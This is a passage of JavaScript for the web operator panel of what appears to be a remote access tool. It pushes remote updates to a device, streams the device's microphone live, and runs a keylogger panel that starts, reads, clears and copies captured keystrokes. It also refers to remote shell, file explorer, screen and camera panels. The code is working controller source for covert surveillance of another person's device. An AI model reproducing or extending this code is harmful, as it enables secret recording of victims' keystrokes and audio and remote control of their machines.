              <p><span class="update-label">Current:</span> <strong>v${esc(d.current)}</strong></p>
              <p><span class="update-label">Latest:</span> <strong style="color:var(--accent)">v${esc(d.version)}</strong></p>
              ${dateStr ? `<p><span class="update-label">Date:</span> ${esc(dateStr)}</p>` : ""}
              ${d.file_name ? `<p><span class="update-label">File:</span> ${esc(d.file_name)}</p>` : ""}
              ${d.notes ? `<p><span class="update-label">Notes:</span> ${esc(d.notes)}</p>` : ""}
            </div>
          </div>`, "flex", "none");
      } else {
        _updateSetBody(
          `<div style="text-align:center;padding:24px 0">
            <div style="font-size:20px;margin-bottom:14px;color:var(--accent)">✓</div>
            <p style="font-size:14px;color:var(--accent)">System up to date</p>
            <p style="color:var(--dim);margin-top:8px">Running v${esc(d.current)}</p>
          </div>`, "none", "flex");
      }
    })
    .catch(() => {
      _updateSetBody(
        `<div style="text-align:center;padding:24px 0">
          <div style="font-size:20px;margin-bottom:14px;color:var(--red)">✗</div>
          <p style="color:var(--red)">Failed to check for updates</p>
        </div>`, "none", "flex");
    });
}

function _updateSetBody(html, actionsDisplay, closeDisplay) {
  $("updateBody").innerHTML = html;
  $("updateActions").style.display = actionsDisplay;
  $("updateClose").style.display = closeDisplay;
}

function _progressBar(pct) {
  return `<div class="progress-bar-track"><div class="progress-bar-fill" style="width:${pct}%"></div></div>
    <p style="color:var(--dim);font-size:11px;margin-top:8px;text-align:center">${pct}%</p>`;
}

function applyUpdate() {
  if (!_updateInfo) return;
  $("updateBtn").disabled = true;
  $("updateBtn").textContent = "Starting...";

  api("/api/update/apply", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ download_url: _updateInfo.download_url, version: _updateInfo.version }),
  })
    .then(() => {
      _updateSetBody(
        `<div style="text-align:center;padding:16px 0">
          <div class="spinner" style="margin:0 auto 16px"></div>
          <p style="font-size:14px;color:var(--accent)">Downloading v${esc(_updateInfo.version)}...</p>
          ${_progressBar(0)}
        </div>`, "none", "none");
      _startUpdatePoll();
    })
    .catch(() => {
      $("updateBtn").disabled = false;
      $("updateBtn").textContent = "Update Now";
    });
}

function _startUpdatePoll() {
  let retries = 0;
  _updatePoll = setInterval(() => {
    apiRaw(`/api/update/status?t=${Date.now()}`)
      .then((r) => { if (!r.ok) throw new Error(); return r.json(); })
      .then((s) => {
        retries = 0;
        if (s.state === "downloading") {
          _updateSetBody(
            `<div style="text-align:center;padding:16px 0">
              <div class="spinner" style="margin:0 auto 16px"></div>
              <p style="font-size:14px;color:var(--accent)">Downloading v${esc(s.version)}...</p>
              <p style="color:var(--dim);font-size:12px;margin-top:6px">${(s.downloaded / 1048576).toFixed(1)} MB</p>
              ${_progressBar(s.percent)}
            </div>`, "none", "none");
        } else if (s.state === "installing") {
          _updateSetBody(
            `<div style="text-align:center;padding:24px 0">
              <div class="spinner" style="margin:0 auto 16px"></div>
              <p style="font-size:14px;color:var(--accent)">Installing...</p>
              <p style="color:var(--dim);margin-top:8px">The app will restart shortly.</p>
              ${_progressBar(100)}
            </div>`, "none", "none");
        } else if (s.state === "error") {
          _stopUpdatePoll();
          _updateSetBody(
            `<div style="text-align:center;padding:24px 0">
              <div style="font-size:20px;margin-bottom:14px;color:var(--red)">✗</div>
              <p style="color:var(--red)">Update Failed</p>
              <p style="color:var(--dim);margin-top:8px">${esc(s.error)}</p>
            </div>`, "none", "flex");
        }
      })
      .catch(() => {
        retries++;
        if (retries >= 3) { _stopUpdatePoll(); _showReconnecting(); }
      });
  }, 1000);
}

function _showReconnecting() {
  const ver = _updateInfo ? _updateInfo.version : "";
  _updateSetBody(
    `<div style="text-align:center;padding:24px 0">
      <div class="spinner" style="margin:0 auto 16px"></div>
      <p style="font-size:14px;color:var(--accent)">Restarting app...</p>
      <p style="color:var(--dim);margin-top:8px">Waiting for device to come back online.</p>
    </div>`, "none", "none");

  let attempts = 0;
  const reconnect = setInterval(() => {
    attempts++;
    apiRaw(`/api/status?t=${Date.now()}`)
      .then((r) => r.json())
      .then((d) => {
        if (d.ok) {
          clearInterval(reconnect);
          conn.version = d.version || ver;
          const vt = $("panelVersion");
          if (vt) vt.textContent = `v${conn.version}`;
          _updateSetBody(
            `<div style="text-align:center;padding:24px 0">
              <div style="font-size:20px;margin-bottom:14px;color:var(--accent)">✓</div>
              <p style="font-size:14px;color:var(--accent)">Update Complete</p>
              <p style="color:var(--dim);margin-top:8px">Now running v${esc(d.version || ver)}</p>
            </div>`, "none", "flex");
          toast("Update installed successfully", "success");
        }
      })
      .catch(() => {
        if (attempts > 30) {
          clearInterval(reconnect);
          _updateSetBody(
            `<div style="text-align:center;padding:24px 0">
              <div style="font-size:20px;margin-bottom:14px;color:var(--yellow)">!</div>
              <p style="color:var(--yellow)">Device not responding</p>
              <p style="color:var(--dim);margin-top:8px">The update may still be installing. Try refreshing later.</p>
            </div>`, "none", "flex");
        }
      });
  }, 2000);
}

function _stopUpdatePoll() {
  if (_updatePoll) { clearInterval(_updatePoll); _updatePoll = null; }
}

function closeUpdate() {
  hide("updateModal");
  _stopUpdatePoll();
  _updateInfo = null;
}

/* ═══ LIVE MIC ═══ */

const mic = { on: false, timer: null, busy: false, ctx: null, next: 0 };

function openLiveMic() {
  show("micOverlay");
  $("micStatus").textContent = "Press Start to listen";
  $("micIcon").classList.remove("active");
  show("micStartBtn");
  hide("micStopBtn");
}

async function startMic() {
  $("micStatus").textContent = "Starting...";
  try {
    const d = await api("/api/mic/start", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{}",
    });
    if (!d.ok) { $("micStatus").textContent = d.error || "Failed"; return; }
    mic.on = true;
    if (!mic.ctx) mic.ctx = new (window.AudioContext || window.webkitAudioContext)();
    if (mic.ctx.state === "suspended") mic.ctx.resume();
    mic.next = mic.ctx.currentTime + 0.1;
    hide("micStartBtn");
    show("micStopBtn");
    $("micStatus").textContent = "Listening...";
    $("micMeta").textContent = "LIVE";
    $("micIcon").classList.add("active");
    mic.timer = setInterval(fetchMicChunk, 400);
  } catch {
    $("micStatus").textContent = "Failed to start";
  }
}

function fetchMicChunk() {
  if (!mic.on || mic.busy) return;
  mic.busy = true;
  apiRaw(`/api/mic/chunk?t=${Date.now()}`)
    .then((r) => {
      const ct = r.headers.get("Content-Type") || "";
      return ct.includes("audio") ? r.arrayBuffer() : null;
    })
    .then((buf) => {
      mic.busy = false;
      if (!buf || !mic.on || !mic.ctx) return;
      mic.ctx.decodeAudioData(buf, (ab) => {
        if (!mic.on) return;
        const src = mic.ctx.createBufferSource();
        src.buffer = ab;
        src.connect(mic.ctx.destination);
        const t = Math.max(mic.next, mic.ctx.currentTime + 0.02);
        src.start(t);
        mic.next = t + ab.duration;
      }, () => {});
    })
    .catch(() => { mic.busy = false; });
}

function stopMic() {
  mic.on = false;
  if (mic.timer) { clearInterval(mic.timer); mic.timer = null; }
  api("/api/mic/stop", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }).catch(() => {});
  show("micStartBtn");
  hide("micStopBtn");
  $("micStatus").textContent = "Stopped";
  $("micMeta").textContent = "Idle";
  $("micIcon").classList.remove("active");
}

function closeMic() { if (mic.on) stopMic(); hide("micOverlay"); }

/* ═══ KEYLOGGER ═══ */

let klPoll = null;

function openKeylog() {
  show("keylogOverlay");
  refreshKl();
  klPoll = setInterval(refreshKl, 1500);
}

function closeKeylog() {
  hide("keylogOverlay");
  if (klPoll) { clearInterval(klPoll); klPoll = null; }
}

function refreshKl() {
  apiRaw("/api/keylog/data")
    .then((r) => r.json())
    .then((d) => {
      if (!d.ok) return;
      $("klStartBtn").classList.toggle("hidden", d.running);
      $("klStopBtn").classList.toggle("hidden", !d.running);
      $("klMeta").textContent = d.running ? `REC · ${d.count} keys` : `${d.count} keys`;
      $("klOutput").textContent = d.data || "(no keystrokes)";
    })
    .catch(() => {});
}

function startKeylog() {
  api("/api/keylog/start", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })
    .then(() => refreshKl());
}

function stopKeylog() {
  api("/api/keylog/stop", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })
    .then(() => refreshKl());
}

function clearKeylog() {
  api("/api/keylog/clear", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })
    .then(() => refreshKl());
}

function copyKeylog() {
  try {
    navigator.clipboard.writeText($("klOutput").textContent);
    toast("Copied to clipboard", "success");
  } catch {
    toast("Failed to copy", "error");
  }
}

/* ═══ LIGHTBOX ═══ */

function openLightbox(src) { $("lbImg").src = src; show("lightbox"); }
function closeLightbox() { hide("lightbox"); $("lbImg").src = ""; }

/* ═══ KEYBOARD SHORTCUTS ═══ */

document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") {
    closeLightbox();
    closeShell();
    closeExplorer();
    closeEditor();
    closeLive();
    closeLiveCam();
    closeMic();
    closeKeylog();
    closeUpdate();
  }
});

/* ═══ HEALTH CHECK ═══ */

function startHealth() {
  stopHealth();
  healthInterval = setInterval(() => {
    apiRaw("/api/status")
      .then((r) => r.json())
      .then(() => {
        $("panelStatus").textContent = "Connected";
        $("panelStatus").className = "status-label";
        $("panelDot").className = "status-dot";
      })
      .catch(() => {
        $("panelStatus").textContent = "Offline";
        $("panelStatus").className = "status-label offline";
        $("panelDot").className = "status-dot offline";
      });
  }, 10000);
}

function stopHealth() {
  if (healthInterval) { clearInterval(healthInterval); healthInterval = null; }
}

/* ═══ INIT ═══ */

window.onload = () => checkAuth();
